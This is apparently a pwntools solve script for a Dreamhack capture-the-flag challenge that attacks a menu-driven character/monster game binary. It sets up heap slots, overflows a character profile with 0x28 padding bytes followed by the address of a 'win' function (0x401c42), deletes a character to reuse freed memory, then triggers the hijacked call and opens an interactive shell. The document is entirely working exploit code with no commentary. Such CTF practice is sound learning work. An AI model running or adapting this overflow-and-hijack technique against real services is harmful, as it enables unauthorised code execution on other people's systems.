from pwn import *

#p = remote('localhost', 1000)
p = remote('host1.dreamhack.games', 23279)

# 1
# Create slot
p.recvuntil(b'>>')
p.sendline(b'1')
p.sendline(b'1')

# Generate character
p.recvuntil(b'>>')
p.sendline(b'2')
p.sendline(b'1')

p.recvuntil(b'Character name: ')
p.sendline(b'A')
p.recvuntil(b'Character profile: ')
p.sendline(b'A')

# 2
# Create slot
p.recvuntil(b'>>')
p.sendline(b'1')
p.sendline(b'2')

# Generate character
p.recvuntil(b'>>')
p.sendline(b'2')
p.sendline(b'2')

p.recvuntil(b'Character name: ')
p.sendline(b'A')
p.recvuntil(b'Character profile: ')

win = 0x401c42
p.send(b'A'*0x28 + p64(win) + b'\n')

# 3
# Delete character
p.recvuntil(b'>>')
p.sendline(b'3')
p.sendline(b'2')

# Generate monster
p.recvuntil(b'>>')
p.sendline(b'4')

# Slay monster
p.recvuntil(b'>>')
p.sendline(b'5')
p.sendline(b'1')


p.interactive()